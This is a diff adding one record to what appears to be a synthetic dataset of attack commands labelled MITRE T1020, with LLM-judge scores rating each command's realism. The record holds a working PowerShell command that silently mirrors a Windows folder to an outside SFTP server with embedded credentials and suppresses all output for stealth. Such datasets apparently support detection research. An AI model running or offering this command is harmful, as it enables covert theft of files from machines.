@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/tasks/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.80/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"synchronize remote C:\\Windows\\Tasks `\"$r`\" -criteria=time -filemask=`\"|*.tmp;|*.log`\"\") 'exit' | Out-Null 2>$null",
+  "explanation": "Uses WinSCP's synchronize mode to automatically mirror scheduled task files to a remote SFTP location while excluding noisy extensions.",
+  "rationale_steps": [
+    "Define mirroring strategy and exclusions",
+    "Connect via SFTP with host key pinning in batch mode",
+    "Synchronize remote with timestamp comparison only",
+    "Suppress all output to remain stealthy"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-1d14d8b8",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes and parentheses, correct use of the call operator, proper escaping for embedded quotes, valid WinSCP /command arguments, and correct output/error redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "Non-interactive WinSCP synchronize remote will mirror C:\\Windows\\Tasks to an SFTP path with exclusions, aligning with automated exfiltration, though using C:\\Windows\\Tasks (vs. System32\\Tasks) and potential access limitations slightly reduce realism.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:05:28.222211Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, balanced parentheses, correct PowerShell syntax for variable assignment, proper use of the ampersand operator for command invocation, and appropriate nested quotes for the WinSCP parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1020 Automated Exfiltration technique by using WinSCP to automatically synchronize Windows Task files to a remote SFTP server with proper authentication, hostkey verification, and file filtering criteria.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:05:31.590868Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, with correct variable assignment, external command invocation using `&`, balanced quotes, proper argument passing to WinSCP, and valid redirection of output streams.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated exfiltration using WinSCP's `synchronize` function to mirror `C:\\Windows\\Tasks` to a remote SFTP server, while correctly excluding specified file types and using plausible arguments for a malicious exfiltration attempt.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:38:32.548944Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
